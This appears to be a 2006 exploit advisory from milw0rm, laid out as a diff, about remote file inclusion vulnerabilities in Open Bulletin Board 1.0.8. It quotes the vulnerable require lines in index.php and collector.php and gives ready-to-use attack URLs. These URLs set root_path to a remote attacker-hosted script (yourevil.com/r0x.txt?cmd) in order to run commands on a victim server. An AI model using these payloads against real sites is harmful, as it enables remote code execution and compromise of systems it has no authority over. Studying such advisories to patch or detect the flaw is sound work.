@@ -1,0 +1,45 @@
++--------------------------------------------------------------------
++
++  Open Bulletin Board 1.0.8 ; Multiple Remote File Include Vulnerabilities
++
++-------------------------------------------------------------------
++
++ Affected Software .: Software
++ Version .............:  Open Bulletin Board 1.0.8
++ Venedor ...........:   http://www.openbb.com
++ Class .............: Remote File Inclusion
++ Risk ..............: high (Remote File Execution)
++ Discovered by ..........: Eddy_BAck0o
++ Contact ...........: l0x3[at]hotmail.com
++
++--------------------------------------------------------------------
++--------------------------------------------------------------------
++ ./index Directory ...
+~ [index.php]
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ require $root_path . "base.php"; <--- 30 - 380
++ require $root_path . "base.php"; <--- 46 - 380
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
++ Ex -->
+http://www.victom.com/index.php?root_path=http://yourevil.com/r0x.txt?cmd
++
++-------------------------------------------------------------------
++
+~ [collector.php]
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ root_path = "./"; <--- 24 - 194
++ require $root_path . "base.php"; <--- 159 - 194
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
++ Ex -->
+http://www.victom.com/index.php?root_path=http://yourevil.com/r0x.txt?cmd
++
++-------------------------------------------------------------------
++ Greetz LEzr.com/vB Member's ; My Team ; My Best [ MoHaJaLi ] ;....
++--------------------------------------------------------------------
++--------------------------------------------------------------------
+
+# milw0rm.com [2006-09-10]
